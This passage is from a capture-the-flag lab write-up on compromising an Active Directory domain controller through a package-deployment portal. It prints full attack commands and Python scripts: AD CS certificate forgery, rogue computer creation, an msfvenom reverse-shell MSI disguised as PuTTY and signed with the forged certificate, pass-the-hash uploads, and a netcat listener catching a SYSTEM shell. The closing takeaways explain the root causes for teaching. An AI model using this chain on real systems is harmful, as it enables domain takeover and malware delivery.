        ValidatorUsername = validatorUsername,
        IsApproved = true,
        Notes = notes,
        ChecklistSignatureOk = checklist.SignatureOk ? "PASS" : "FAIL",
        ChecklistHashOk = checklist.HashOk ? "PASS" : "FAIL",
        ChecklistProductCodeOk = checklist.ProductCodeOk ? "PASS" : "FAIL",
        ChecklistMetadataOk = checklist.MetadataOk ? "PASS" : "FAIL"
    });

    await _db.SaveChangesAsync();
    ...
}
```

**The bug, explained simply:** The validation "checklist" (signature OK? hash OK? product code OK? metadata OK?) is just a set of checkboxes that get *recorded* — the server never actually re-verifies any of them itself. A validator (or anyone who can call this endpoint as a validator) can submit the approval with **every checkbox unchecked/false**, and the package still gets promoted straight to the "Ready" queue and installed. The *real* signature enforcement only happens later and separately, inside `Deploy-Engine.ps1`, which checks the MSI's actual Authenticode certificate Subject/Issuer against the `TrustedCert` config shown earlier. So: the validator-level UI/checklist is pure theater, but the underlying deploy engine really does check the cert. That means our exploitation path has to (a) get a validator to rubber-stamp our package (easy, since the checklist is fake), and (b) make sure the MSI is *actually* signed by a cert whose Subject really is `CN=Package_Developers` issued by `scaffold-DC-CA` (harder — this is the real gate).

### 9.3 Mapping out the roles

- **`Package_Developers`** (`d.cooper`, `t.walker`): can upload/submit packages.
- **`Package_Validators`** (only `m.chen`): the sole account able to approve packages.
- We already own `d.cooper` (developer). We now need to either become `m.chen` or otherwise get an approval through as `m.chen`, **and** need a certificate that legitimately maps to `CN=Package_Developers`, signed by the domain CA.

---

## 10. Abusing AD CS (Certipy) to forge a compliant code-signing certificate

### 10.1 Enumerating certificate templates

```
certipy find -u d.cooper -hashes [REDACTED-NT-HASH] -dc-ip 10.129.xx.xx -stdout
```

Key findings on the CA (`scaffold-DC-CA`):

- **ESC8** flagged: Web Enrollment is enabled over HTTPS with Channel Binding (EPA) disabled — noted, but not the path actually used here.

Three relevant certificate templates:

| Template               | Client Auth | Enrollee Supplies Subject | Enrollment rights   |
|-------------------------|:-----------:|:--------------------------:|----------------------|
| `PackagingCodeSigning`  | No          | **Yes**                    | `Domain Computers`   |
| `InternalCodeSigning`   | Yes         | No                          | `Package_Developers` |
| `DevCodeSigning`        | No          | No                          | `Package_Developers` |

**Why `PackagingCodeSigning` matters:** it is enrollable by any **Domain Computer** account, and critically has `Enrollee Supplies Subject = Yes` — meaning whoever enrolls gets to **choose their own certificate Subject name**, with no server-side validation tying it to their actual identity. Combine that with the fact that any authenticated user can normally join a limited number of computers to the domain (`MachineAccountQuota`), and the attack becomes: **create a fake computer account, then enroll it for a cert with `Subject=CN=Package_Developers`** — a subject that has nothing to do with what the computer account actually is, but which satisfies exactly what `Deploy-Engine.ps1` checks for.

### 10.2 First attempt to add a computer — blocked by quota

```
impacket-addcomputer scaffold.htb/d.cooper -hashes :[REDACTED-NT-HASH] -dc-ip 10.129.xx.xx \
  -computer-name 'evilpc$' -computer-pass '[REDACTED]'
```

```
[-] Authenticating account's machine account quota exceeded!
```

Checking the domain-wide `MachineAccountQuota` confirms why:

```
nxc ldap 10.129.xx.xx -u d.cooper -H [REDACTED-NT-HASH] -M maq
```

```
MAQ  10.129.xx.xx  389  DC  [*] Getting the MachineAccountQuota
MAQ  10.129.xx.xx  389  DC  MachineAccountQuota: 0
```

`MachineAccountQuota` is set to `0` domain-wide, so no user can add computer objects using the default self-service quota mechanism. A different route to create the computer object is required.

### 10.3 Finding a delegated OU where `Package_Developers` can create computer objects

Enumerating the OU structure:

```
nxc ldap 10.129.xx.xx -u d.cooper -H [REDACTED-NT-HASH] \
  --query "(objectClass=organizationalUnit)" "distinguishedName"
```

```
OU=Domain Controllers,DC=scaffold,DC=htb
OU=Scaffold,DC=scaffold,DC=htb
OU=Helpdesk,OU=Scaffold,DC=scaffold,DC=htb
OU=IT,OU=Scaffold,DC=scaffold,DC=htb
OU=Packaging_Team,OU=Scaffold,DC=scaffold,DC=htb
OU=Deploy_Operator,OU=Scaffold,DC=scaffold,DC=htb
OU=ManagedObjects,OU=Scaffold,DC=scaffold,DC=htb
OU=Users,OU=Scaffold,DC=scaffold,DC=htb
OU=Dev_Machines,OU=Packaging_Team,OU=Scaffold,DC=scaffold,DC=htb
```

`Dev_Machines` under `Packaging_Team` stands out as a likely place where `Package_Developers` were delegated rights to manage their own dev machines.

Reading its DACL confirms it:

```
impacket-dacledit -action read -target-dn 'OU=Dev_Machines,OU=Packaging_Team,OU=Scaffold,DC=scaffold,DC=htb' \
  scaffold.htb/d.cooper -hashes :[REDACTED-NT-HASH]
```

```
[*] ACE[2] info
    ACE Type      : ACCESS_ALLOWED_OBJECT_ACE
    ACE flags     : CONTAINER_INHERIT_ACE
    Access mask   : CreateChild (0x1)
    Object type (GUID) : Computer (bf967a86-0de6-11d0-a285-00aa003049e2)
    Trustee (SID) : Package_Developers (S-1-5-21-...-1104)
```

Confirmed: `Package_Developers` has `CreateChild` rights specifically for `Computer` objects under this OU — completely independent of, and not limited by, the domain-wide `MachineAccountQuota`.

### 10.4 Creating the rogue computer account under the delegated OU

```
bloodyad -d scaffold.htb -H dc.scaffold.htb -u d.cooper -p ':[REDACTED-NT-HASH]' \
  add computer 'evilpc' '[REDACTED]' --ou 'OU=Dev_Machines,OU=Packaging_Team,OU=Scaffold,DC=scaffold,DC=htb'
```

```
[+] evilpc$ created
```

### 10.5 Enrolling the rogue computer for a `PackagingCodeSigning` cert with a forged Subject

```
certipy-ad req -u 'evilpc$' -p '[REDACTED]' -dc-ip 10.129.xx.xx \
  -ca scaffold-DC-CA -template PackagingCodeSigning -subject 'CN=Package_Developers'
```

```
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Got certificate with subject: CN=Package_Developers
[*] Got certificate without identity
[*] Certificate has no object SID
[*] Saving certificate and private key to 'evilpc.pfx'
```

We now hold a legitimate, CA-signed certificate whose Subject is exactly `CN=Package_Developers` — satisfying `Deploy-Engine.ps1`'s trust check — even though it was issued to a throwaway computer account we created ourselves.

---

## 11. Building and signing a malicious MSI package

### 11.1 Generating a reverse-shell MSI payload

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.xx.xx LPORT=4444 -f msi -o evil.msi
```

```
Payload size: 460 bytes
Final size of msi file: 159744 bytes
Saved as: evil.msi
```

### 11.2 Dressing up the MSI's metadata to look legitimate

Using `msibuild` to patch the MSI's internal Property table so it looks like a normal software package (e.g. a "PuTTY" installer) rather than a raw msfvenom artifact:

```
msibuild evil.msi \
  -q "UPDATE Property SET Value='PuTTY' WHERE Property='ProductName'" \
  -q "UPDATE Property SET Value='{ED41CD4E-33BB-400C-AB20-B09388DC83EF}' WHERE Property='ProductCode'" \
  -q "UPDATE Property SET Value='99.0.0' WHERE Property='ProductVersion'" \
  -q "UPDATE Property SET Value='PuTTY' WHERE Property='Manufacturer'"
```

### 11.3 Signing the MSI with the forged certificate

```
osslsigncode sign -pkcs12 evilpc.pfx -pass '' -n 'PuTTY' -i 'https://scaffold.htb' \
  -h sha256 -in evil.msi -out evil_signed.msi
```

```
Succeeded
```

### 11.4 Verifying the signature actually satisfies the trust requirement

From an existing WinRM shell as `d.cooper`, uploading and checking the signature with native PowerShell:

```
*Evil-WinRM* PS C:\Users\d.cooper\Documents> Get-AuthenticodeSignature ./evil_signed.msi | Format-List *
```

```
SignerCertificate : [Subject]
                       CN=Package_Developers

                    [Issuer]
                       CN=scaffold-DC-CA, DC=scaffold, DC=htb

Status            : Valid
StatusMessage     : Signature verified.
```

This is exactly the Subject/Issuer pair `Deploy-Engine.ps1` was configured to trust — the forged certificate chain checks out.

---

## 12. Uploading and approving the malicious package through the portal's web API

Since `ScaffoldPortal` uses Windows/NTLM authentication and the flows (upload, review, approve) are simple form posts with an anti-forgery (CSRF) token, small Python scripts were written to automate the browser workflow using `d.cooper`'s NT hash (pass-the-hash over NTLM to the web app) for the upload, and `m.chen`'s hash for the approval.

### 12.1 Interesting discovery: `m.chen` shares the same NT hash as `d.cooper`

While preparing the approval step, it turned out — with help from the community — that `m.chen`'s NT hash is **identical** to `d.cooper`'s previously-obtained hash. This was verified directly:

```
nxc smb 10.129.xx.xx -u m.chen -H [REDACTED-NT-HASH]
```

```
SMB  10.129.xx.xx  445  DC  [+] scaffold.htb\m.chen:[REDACTED-NT-HASH]
```

The `[+]` confirms it: this is **password reuse across two entirely different named accounts** (`d.cooper` the developer and `m.chen` the validator) — both using the same underlying password/NT hash, most likely because both were seeded with the same default/onboarding credential and never individually rotated. This directly hands us the "approver" identity we needed without any extra cracking.

### 12.2 Uploading the malicious MSI as `d.cooper`

```python
#!/usr/bin/python3

import requests
import urllib3
from bs4 import BeautifulSoup
from requests_ntlm import HttpNtlmAuth

# Disable HTTPS certificate warnings
urllib3.disable_warnings(
    urllib3.exceptions.InsecureRequestWarning
)

# Configuration
HASH = "aad3b435b51404eeaad3b435b51404ee:[REDACTED-NT-HASH]"

URL = "https://portal.scaffold.htb/Package/Upload"

USERNAME = r"SCAFFOLD\d.cooper"

MSI_FILE = "evil_signed.msi"

# Create session
s = requests.Session()
s.verify = False

# NTLM authentication
s.auth = HttpNtlmAuth(USERNAME, HASH)

try:
    # Step 1: Get upload page
    print("[*] Requesting upload page...")

    r = s.get(URL)

    print("[+] GET status:", r.status_code)
    print("[+] GET URL:", r.url)

    r.raise_for_status()

    # Step 2: Extract CSRF token
    soup = BeautifulSoup(r.text, "html.parser")

    token_input = soup.find(
        "input",
        {"name": "__RequestVerificationToken"}
    )

    if not token_input:
        print("[-] CSRF token not found!")
        exit(1)

    token = token_input["value"]

    print("[+] CSRF token obtained")

    # Step 3: Open MSI
    print(f"[*] Opening {MSI_FILE}...")

    with open(MSI_FILE, "rb") as f:

        # Step 4: Upload MSI
        print("[*] Uploading MSI...")

        r = s.post(
            URL,
            data={
                "__RequestVerificationToken": token
            },
            files={
                "file": (
                    "putty-64bit-0.84-installer_signed.msi",
                    f,
                    "application/x-msi"
                )
            },
            allow_redirects=False
        )

    # Step 5: Print response
    print("\n========== RESULT ==========")

    print("[+] Upload status:", r.status_code)

    print("[+] Location:", r.headers.get("Location"))

    print("[+] Response headers:")
    for key, value in r.headers.items():
        print(f"    {key}: {value}")

    print("\n[+] Response body:")
    print(r.text[:1000])

    print("\n============================")

except FileNotFoundError:
    print(f"[-] File not found: {MSI_FILE}")
    print("    Make sure evil_signed.msi is in the same directory.")

except requests.exceptions.RequestException as e:
    print(f"[-] Request failed: {e}")

except Exception as e:
    print(f"[-] Error: {e}")

```

Running it:

```
python3 upload_msi.py
```

```
[*] Requesting upload page...
[+] GET status: 200
[+] CSRF token obtained
[*] Uploading MSI...

========== RESULT ==========
[+] Upload status: 302
[+] Location: /Package/Details/9
```

A `302` redirect to `/Package/Details/9` confirms the package was accepted and now exists as package ID `9` in the system, sitting in the "Incoming" queue awaiting validation.

### 12.3 Approving the package as `m.chen` (using the checklist-bypass bug from section 9.2)

```python
#!/usr/bin/python3

import requests
import urllib3
from bs4 import BeautifulSoup
from requests_ntlm import HttpNtlmAuth

# Disable HTTPS certificate warnings
urllib3.disable_warnings(
    urllib3.exceptions.InsecureRequestWarning
)

# Configuration
HASH = "aad3b435b51404eeaad3b435b51404ee:[REDACTED-NT-HASH]"

USERNAME = r"SCAFFOLD\m.chen"

REVIEW_URL = "https://portal.scaffold.htb/Validation/Review/9"

APPROVE_URL = "https://portal.scaffold.htb/Validation/Approve/9"

# Create session
s = requests.Session()
s.verify = False

# NTLM authentication
s.auth = HttpNtlmAuth(USERNAME, HASH)

try:
    # Step 1: GET review page
    print("[*] Requesting validation review page...")

    r = s.get(REVIEW_URL)

    print("[+] GET status:", r.status_code)
    print("[+] GET URL:", r.url)

    r.raise_for_status()

    # Step 2: Extract antiforgery token
    soup = BeautifulSoup(r.text, "html.parser")

    token_input = soup.find(
        "input",
        {"name": "__RequestVerificationToken"}
    )

    if not token_input:
        print("[-] Antiforgery token not found!")
        exit(1)

    token = token_input["value"]

    print("[+] Antiforgery token obtained")

    # Step 3: POST approval
    print("[*] Submitting approval request...")

    data = {
        "__RequestVerificationToken": token,
        "id": "9",
        "notes": "Signature and hash verified.",
        "signatureOk": "true",
        "hashOk": "true",
        "productCodeOk": "true",
        "metadataOk": "true",
    }

    r = s.post(
        APPROVE_URL,
        data=data,
        allow_redirects=False
    )

    # Step 4: Print response
    print("\n========== RESULT ==========")

    print("[+] Approval status:", r.status_code)

    print("[+] Location:", r.headers.get("Location"))

    print("[+] Response headers:")

    for key, value in r.headers.items():
        print(f"    {key}: {value}")

    print("\n[+] Response body:")
    print(r.text[:1000])

    print("\n============================")

except requests.exceptions.RequestException as e:
    print(f"[-] Request failed: {e}")

except Exception as e:
    print(f"[-] Error: {e}")
```

Running it:

```
python3 approve_msi.py
```

```
[*] Requesting validation review page...
[+] GET status: 200
[+] Antiforgery token obtained
[*] Submitting approval request...

========== RESULT ==========
[+] Approval status: 302
[+] Location: /Validation
```

The `302` redirect back to `/Validation` confirms the approval succeeded — package `9` is now marked **Approved** and moved into the "Ready" folder that the deploy engine watches.

> Note: The specific package ID (`9`, `/Package/Details/9`, `/Validation/Review/9`) will vary depending on how many times a package has been uploaded in a given run — always confirm the actual ID returned by the upload step before running the approval script.

---

## 13. SYSTEM shell via the automatic deploy engine

The portal's backing infrastructure runs a scheduled script, `Deploy-Engine.ps1`, which periodically scans the "Ready" package folder, re-checks the Authenticode signature against the `TrustedCert` config (Subject contains `CN=Package_Developers`, Issuer contains `scaffold-DC-CA` — both of which our forged cert satisfies), and if it passes, **silently installs the MSI as `NT AUTHORITY\SYSTEM`**.

Since our `evil_signed.msi` is really a `msfvenom` reverse-shell payload, running it as SYSTEM triggers a callback to our listener:

```
nc -nlvp 4444
```

```
listening on [any] 4444 ...
connect to [10.10.xx.xx] from (UNKNOWN) [10.129.xx.xx] 50465
Microsoft Windows [Version 10.0.20348.587]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

Full SYSTEM access on the Domain Controller.

### 13.1 Grabbing the root flag

```
C:\Users\Administrator\Desktop>type root.txt
[REDACTED]
```

---

## 14. Step-by-Step Summary

1. **Recon:** `nmap`/`rustscan` against `10.129.xx.xx` show a full AD Domain Controller (Kerberos, LDAP, SMB, GC, WinRM) plus a custom IIS site bound to `portal.scaffold.htb`, and two unusual ports 9800/9801.
2. **Validate given creds:** `j.harris`'s credentials work over SMB; enumerated shares reveal an MDT/WDS deployment environment (`DeploymentShare$`, `REMINST`, `Y$`).
3. **Web portal:** Logging into `portal.scaffold.htb` as `j.harris` only yields a restricted guest dashboard for a custom "ScaffoldPortal" package-management app.
4. **LDAP description leak:** `nxc ldap ... -M get-desc-users` reveals a temp password for `m.carter` sitting in the account's `description` field — password is correct but the account is disabled.
5. **User enumeration:** `impacket-lookupsid` RID-cycles the domain to build a full username list and reveals telling group names (`Package_Developers`, `Deploy_Operators`, `Endpoint Remote Management`, `Quarantined_Accounts`, `Identity_Operations`).
6. **Extra ports found:** `rustscan` reveals MDT's MonitorService on 9800 (SOAP, `MDTMonitorEvent`) and 9801 (OData, `MDTMonitorData`), both unauthenticated.
7. **XXE exploitation:** Using a public XXE exploit against the MDT MonitorService (`https://github.com/garrettfoster13/wtftp`, and a simplified reimplementation `https://github.com/manbahadurthapa1248/MDT-XXE-exploit`), remotely read `CustomSettings.ini` and `Bootstrap.ini` off the deployment share — leaking plaintext credentials for `svc_deploy`/`DomainAdmin` and `svc_mdt`.
8. **Password spraying with proof:** Systematically sprayed each leaked password against all known users, recording NetExec's exact status codes; `svc_mdt`'s password is confirmed correct but the account is expired; a second `svc_deploy` password variant is confirmed working for **both** `svc_deploy` and `r.wilson` (password reuse, proven via `[+]` login success on both).
9. **ACL abuse chain to enable `m.carter`:**
   - `r.wilson` adds himself to `Helpdesk operator` (which has `GenericWrite` on `m.carter`).
   - `userAccountControl` on `m.carter` is set to `66048`, enabling the account (confirmed via status code changing from `STATUS_ACCOUNT_DISABLED` to `STATUS_LOGON_TYPE_NOT_GRANTED`).
   - `svc_deploy` (via `Identity_Operations`' `WriteProperty` rights, confirmed with `impacket-dacledit`) flips `Quarantined_Accounts`'s `groupType` to a Distribution group, lifting the quarantine GPO's effect on `m.carter` (confirmed via successful SMB login).
   - The same `groupType` trick converts `IT` into a Security/Universal group so it can be a meaningful nested membership.
   - `m.carter` adds himself to the custom `Endpoint Remote Management` group.
10. **DCOM instead of WinRM:** `Endpoint Remote Management` doesn't grant WinRM rights, so `impacket-dcomexec` (MMC20 object over DCOM/RPC) is used instead — verified with an ICMP ping capture, then used to launch a PowerShell reverse shell as `m.carter`. **User flag captured.**
11. **Certificate theft & cracking:** Two `.pfx` code-signing certs found under `C:\Dev\DevCerts`, exfiltrated, and cracked with `pfx2john` + `john`/rockyou (both share the same cracked password — more reuse).
12. **Certipy identity extraction:** One PFX maps to `d.cooper` and successfully authenticates via PKINIT, yielding `d.cooper`'s NT hash; the other maps to `t.walker` but fails PKINIT trust checks and is abandoned.
13. **WinRM as `d.cooper`:** Pass-the-hash login via `evil-winrm`; `d.cooper` is a `Package_Developer` with real WinRM rights.
14. **Source-code review of ScaffoldPortal:** `appsettings.json` reveals the deploy engine's certificate trust requirement (`Subject` must contain `CN=Package_Developers`, `Issuer` must contain `scaffold-DC-CA`); `Services.cs` reveals that the human validation "checklist" is never actually re-verified server-side — only the deploy engine's own signature check is real.
15. **AD CS abuse (ESC-style template misuse):** `certipy find` reveals the `PackagingCodeSigning` template lets **any Domain Computer** enroll with a **caller-supplied Subject**. Domain-wide `MachineAccountQuota` is `0`, blocking the default self-service computer-creation route — but a delegated OU (`Dev_Machines`) grants `Package_Developers` direct `CreateChild` rights on Computer objects (confirmed via `dacledit`), bypassing the quota entirely.
16. **Forge the trusted certificate:** A rogue computer account (`evilpc$`) is created under the delegated OU and used to enroll for a `PackagingCodeSigning` certificate with `Subject=CN=Package_Developers` — a subject with no real connection to the computer account, but which exactly matches what the deploy engine trusts.
17. **Weaponized MSI:** `msfvenom` builds a reverse-shell MSI, `msibuild` dresses up its metadata to look like a normal app ("PuTTY"), and `osslsigncode` signs it with the forged certificate — `Get-AuthenticodeSignature` confirms the signature is valid and matches the trusted Subject/Issuer.
18. **Upload & approve via the web app's own API:** A Python/NTLM script uploads the malicious MSI as `d.cooper`. A second script approves it as `m.chen` — discovered, with community help, to share the **exact same NT hash** as `d.cooper` (yet more password/credential reuse), so no additional cracking was needed to act as the validator. The approval submits the fake "all checks passed" checklist, which the server accepts without re-verifying anything (per the bug found in step 14).
19. **Automatic SYSTEM execution:** The scheduled `Deploy-Engine.ps1` picks up the newly "Approved" package, validates only the Authenticode certificate (which passes, since it's the forged-but-legitimately-CA-issued cert), and silently installs it as `NT AUTHORITY\SYSTEM`, triggering the reverse shell payload back to the attacker's listener. **Root flag captured.**

---

## 15. Key Takeaways / Root Causes

- **Secrets in AD attribute fields** (`description`) are still a common and trivially discoverable leak vector.
- **Unauthenticated legacy services** (MDT MonitorService on 9800/9801) exposed an XXE that leaked plaintext deployment credentials straight out of `CustomSettings.ini`/`Bootstrap.ini` — files that, by design, often contain domain-join credentials.
- **Rampant password reuse** appeared at almost every stage of this box: the same password worked for `svc_deploy` and `r.wilson`; the same PFX password protected two unrelated certificates; and `d.cooper` and `m.chen` shared an identical NT hash. Each reuse instance was independently proven with explicit login/auth success rather than assumed.
- **Over-permissive/attribute-level ACL delegation** (`GenericWrite`, `WriteProperty` on `groupType`, delegated `CreateChild` on Computer objects) allowed a low-privileged chain of custody (`j.harris` → `r.wilson`/`svc_deploy` → `m.carter` → `d.cooper`) to escalate purely through legitimate-looking, individually-small AD object edits.
- **AD CS template misconfiguration** (`Enrollee Supplies Subject = Yes` combined with broad `Domain Computers` enrollment rights) allowed a forged identity claim (`CN=Package_Developers`) to be baked into an otherwise legitimately-issued, CA-signed certificate.
- **Client-side/UI-only validation trusted by the backend:** the package-approval "checklist" gave a false sense of a security control, when the only real enforcement point was the deploy engine's own signature check — and that check trusted Subject/Issuer strings that could be forged via the AD CS misconfiguration above.
- **Custom groups with partial/unexpected rights** (`Endpoint Remote Management` granting DCOM but not WinRM) required pivoting execution methods rather than assuming a "remote management" group implies WinRM access.
